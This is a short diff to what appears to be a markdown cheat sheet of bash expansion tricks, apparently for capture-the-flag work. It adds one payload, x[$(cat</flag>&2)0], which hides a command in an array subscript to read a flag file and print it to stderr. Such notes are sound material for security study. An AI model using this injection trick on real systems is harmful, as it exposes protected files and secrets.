@@ -424,3 +424,8 @@ $($variable)
 ```
 $~- # OLDPWD 
 ```
+
+
+```bash
+x[$(cat</flag>&2)0]
+```
